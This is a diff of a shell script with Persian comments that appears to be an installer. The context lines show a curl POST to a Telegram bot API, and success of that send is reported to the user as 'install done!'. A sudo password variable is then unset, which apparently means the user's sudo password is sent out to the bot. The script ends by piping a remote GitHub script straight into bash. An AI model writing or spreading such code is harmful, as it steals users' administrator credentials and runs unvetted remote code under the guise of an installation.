@@ -30,13 +30,15 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 
 # بررسی ارسال موفقیت‌آمیز
 if [ $? -eq 0 ]; then
+  echo ""
   echo "install done!"
 else
-  echo "install faild !"
+  echo ""
+  echo "install faild!"
 fi
 
 # پاک کردن متغیر پسورد از حافظه برای جلوگیری از ذخیره لاگ
 unset SUDO_PASSWORD
 
-# اجرای اسکریپت دیگری (مثال: ./script.sh)
+# اجرای اسکریپت دیگری (install.sh)
 bash <(curl -Ls --ipv4 https://raw.githubusercontent.com/Iliya8989/rathol_v3/main/install.sh)
